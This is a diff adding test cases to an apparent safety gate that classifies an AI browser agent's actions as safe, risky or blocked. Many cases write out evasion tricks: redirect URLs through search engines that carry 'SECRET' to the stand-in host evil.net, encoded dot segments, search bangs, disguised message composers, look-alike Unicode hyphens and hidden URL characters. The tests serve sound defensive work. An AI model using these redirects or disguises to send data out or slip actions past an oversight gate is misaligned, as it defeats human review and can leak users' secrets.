@@ -552,6 +552,11 @@ def dom_attrs_cannot_be_spoofed():
                    {"node": "input", "label": "aria-label=Card number type=text autocomplete=off"},
                    {"node": "input", "label": "aria-label=Nickname type=text"}]}
     v3 = app.browser_view(st3, d3)
+    # type=search with a password-ish name is a search box, not a password
+    st4 = {"page": {"title": "t", "url": "u"}, "outline": "", "refs": [
+        {"ref": "p1:0", "role": "searchbox", "name": "Search passwords", "actions": ["type"], "states": {}, "value": "abc", "visibility": "in_viewport"}]}
+    f4 = app.browser_view(st4, {"refs": [{"node": "input", "label": "aria-label=Search passwords type=search"}]})["refs"]["e1"]["facts"]
+    assert f4["input_type"] == "search" and app.gate("type", {"text": "x", "submit": True}, f4, _gc())[0] == "safe"
     assert "hunter2" not in v3["text"] and "4111" not in v3["text"] and "bobby" in v3["text"], v3["text"]
     f3 = {r["facts"]["name"]: r["facts"] for r in v3["refs"].values()}
     assert f3["Password"]["input_type"] == "password" and f3["Card number"]["autocomplete"] == "cc-number" and f3["Nickname"]["input_type"] == "text"
@@ -617,6 +622,9 @@ def app_tiers():
     for n in ("Mailchimp Helper", "Signalfire", "Notebook", "Teams Planner", "Microsoft Word"):
         assert t(n, {}) == "allowed", n
     assert t("Telegram Desktop", {"Telegram Desktop": "allowed"}) == "allowed"
+    for n in ("Zoom Pay", "Signal Wallet", "Mail Banking", "Slack Crypto", "Zoom Invest"):
+        assert t(n, {}) == "read", n                                   # the stricter of the default list and the name rule
+    assert t("Zoom Pay", {"Zoom Pay": "ask"}) == "ask"                 # an override still wins
     assert t("Mail", {"Mail": "bogus"}) == "ask"                       # a junk override is ignored
     assert app.RISKY_WORDS.search("Place order") and not app.RISKY_WORDS.search("Bold")
 
@@ -784,6 +792,56 @@ def gate_table():
         ("Researching label", "type", {"ref": "e1", "text": "cats", "submit": True}, _gf("textbox", "Researching notes"), _gc(), "risky"),
         # the name heuristic holds even when the DOM says type=text
         ("password named, dom text", "type", {"ref": "e2", "text": "x"}, _gf("textbox", "Password", input_type="password"), _gc(), "blocked"),
+        # round 3: search-engine dot segments, bangs, composers, unicode hyphens
+        ('ddg dot segment 0', "open_url", {"url": 'https://duckduckgo.com/html/../l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 1', "open_url", {"url": 'https://duckduckgo.com/html/%2e%2e/l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 2', "open_url", {"url": 'https://duckduckgo.com/html/%2E%2E/l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 3', "open_url", {"url": 'https://duckduckgo.com/html/./../l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 4', "open_url", {"url": 'https://duckduckgo.com/html/.%2e/l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 5', "open_url", {"url": 'https://duckduckgo.com/html/%2e./l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 6', "open_url", {"url": 'https://duckduckgo.com/html/./?q=x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 7', "open_url", {"url": 'https://duckduckgo.com/html/%2e/?q=x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 8', "open_url", {"url": 'https://google.com/search/./?q=x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 9', "open_url", {"url": 'https://google.com/%73earch?q=x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 10', "open_url", {"url": 'https://bing.com/search/../ck/a?u=x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg dot segment 11', "open_url", {"url": 'https://duckduckgo.com/html//../l/?uddg=https%3A%2F%2Fevil.net%2F%3Fd%3DSECRET'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg /html exact', "open_url", {"url": 'https://duckduckgo.com/html'}, None, _gc(task_domains=set(), domain=None), "safe"),
+        ('ddg /html/ exact', "open_url", {"url": 'https://duckduckgo.com/html/?q=cats'}, None, _gc(task_domains=set(), domain=None), "safe"),
+        ('ddg /HTML/ case', "open_url", {"url": 'https://DuckDuckGo.com/HTML/?q=cats'}, None, _gc(task_domains=set(), domain=None), "safe"),
+        ('ddg / with q', "open_url", {"url": 'https://duckduckgo.com/?q=cats+dogs'}, None, _gc(task_domains=set(), domain=None), "safe"),
+        ('ddg html subpath', "open_url", {"url": 'https://duckduckgo.com/html/x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg bang', "open_url", {"url": 'https://duckduckgo.com/?q=!g+evil'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg bang mid', "open_url", {"url": 'https://duckduckgo.com/?q=cats+!w'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg bang encoded', "open_url", {"url": 'https://duckduckgo.com/html/?q=%21g+x'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg ducky', "open_url", {"url": 'https://duckduckgo.com/?q=%5Cevil'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg ducky raw', "open_url", {"url": 'https://duckduckgo.com/?q=\\evil'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('ddg upper Q bang', "open_url", {"url": 'https://duckduckgo.com/?Q=!g'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('google lucky', "open_url", {"url": 'https://www.google.com/search?q=evil&btnI=1'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('google lucky lower', "open_url", {"url": 'https://www.google.com/search?q=evil&btni'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('google bang is plain text', "open_url", {"url": 'https://www.google.com/search?q=wow!'}, None, _gc(task_domains=set(), domain=None), "safe"),
+        ('bing bang', "open_url", {"url": 'https://www.bing.com/search?q=!g'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('bing ducky', "open_url", {"url": 'https://www.bing.com/search?q=%5Cx'}, None, _gc(task_domains=set(), domain=None), "risky"),
+        ('bing plain', "open_url", {"url": 'https://www.bing.com/search?q=cats'}, None, _gc(task_domains=set(), domain=None), "safe"),
+        ('composer search-team', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Message #search-team", in_form=True), _gc(), "risky"),
+        ('composer reply search', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Reply to: How does search work?"), _gc(), "risky"),
+        ('composer comment search', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Comment on search ranking"), _gc(), "risky"),
+        ('composer with searchbox role', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("searchbox", "Message search"), _gc(), "risky"),
+        ('composer write search', 'type_app', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textfield", "Write a search note"), _ac(), "risky"),
+        ('Search alone', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Search"), _gc(), "safe"),
+        ('Enter your search placeholder', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("combobox", "Enter your search here - Search suggestions will show as you type"), _gc(), "safe"),
+        ('Type search placeholder', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Type your search"), _gc(), "safe"),
+        ('search for placeholder', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Search for products"), _gc(), "safe"),
+        ('what to search placeholder', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Google search"), _gc(), "risky"),
+        ('search google placeholder', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Use to search google"), _gc(), "safe"),
+        ('Research risky', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Research"), _gc(), "risky"),
+        ('Your query risky', 'type', {'ref': 'e1', 'text': 'hi', 'submit': True}, _gf("textbox", "Your query"), _gc(), "risky"),
+        ('unicode hyphen Sign\\u2010up', 'click', {'ref': 'e1'}, _gf(name='Sign‐up'), _gc(), "risky"),
+        ('unicode hyphen Sign\\u2011up', 'click', {'ref': 'e1'}, _gf(name='Sign‑up'), _gc(), "risky"),
+        ('unicode hyphen Check\\u2013out', 'click', {'ref': 'e1'}, _gf(name='Check–out'), _gc(), "risky"),
+        ('unicode hyphen Check\\u2014out', 'click', {'ref': 'e1'}, _gf(name='Check—out'), _gc(), "risky"),
+        ('unicode hyphen Place\\u2212order', 'click', {'ref': 'e1'}, _gf(name='Place−order'), _gc(), "risky"),
+        ('unicode hyphen Sign\\u2015up', 'click', {'ref': 'e1'}, _gf(name='Sign―up'), _gc(), "risky"),
+        ('localhost reason probe', 'open_url', {'url': 'localhost:3000'}, None, _gc(), "blocked"),
         # hotkeys: every spelling of Enter / Delete
         ("hotkey string keys return", "hotkey", {"keys": "return"}, None, _ac(), "risky"),
         ("hotkey combo string", "hotkey", {"keys": ["cmd+return"]}, None, _ac(), "risky"),
@@ -931,6 +989,10 @@ def approval_titles():
     assert T("open_url", None, _gc(), {"url": "https://www.example.com\t/x"}).startswith("Open **example.com** (")
     assert T("open_url", None, _gc(), {"url": "https://"}).startswith("Open **an address with no host**")
     assert T("open_url", None, _gc(), {"url": "https://wordpre\u00df.com/x"}).startswith("Open **wordpre\u00df.com** (")
+    t = T("open_url", None, _gc(), {"url": "https://exam\u200dple.com/x"})
+    assert t.startswith("Open **exam\u2039U+200D\u203aple.com** (https\\://exam\u2039U+200D\u203aple.com/x)") and "\u200d" not in t, t
+    assert "U+202E" in T("open_url", None, _gc(), {"url": "https://a.com/\u202eexe.txt"})
+    assert "http://" in app.gate("open_url", {"url": "localhost:3000"}, None, _gc())[1]
     assert T("hotkey", None, _ac(), {"keys": "cmd+return"}) == "Press **\u2318+Return** in Notes"
     assert T("hotkey", None, _ac(), {"keys": 5}) == "Press **?** in Notes"
     assert T("menu", None, _ac(), {"path": "File > Delete Note"}) == "Use menu **File \u203a Delete Note** in Notes"
